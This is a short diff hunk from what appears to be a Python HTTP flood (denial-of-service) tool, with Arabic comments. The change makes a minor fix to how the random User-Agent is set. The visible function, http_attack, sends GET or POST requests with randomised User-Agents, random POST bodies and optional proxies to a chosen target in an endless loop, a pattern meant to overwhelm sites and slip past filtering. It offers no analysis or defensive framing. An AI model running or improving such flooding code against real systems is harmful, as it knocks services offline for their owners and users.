@@ -33,7 +33,7 @@ def random_post_data(length=50):
 async def http_attack(target, proxy=None, method="GET", headers=None, success_counter=None, failure_counter=None):
     async with aiohttp.ClientSession(trust_env=True) as session:  # استخدام trust_env لدعم البروكسيات
         while True:
-            headers = headers or {'User-Agent': ua.random}  # توليد User-Agent عشوائي
+            headers = headers or {'User-Agent': str(ua.random)}  # توليد User-Agent عشوائي
             try:
                 if method.upper() == "POST":
                     # توليد بيانات POST عشوائية
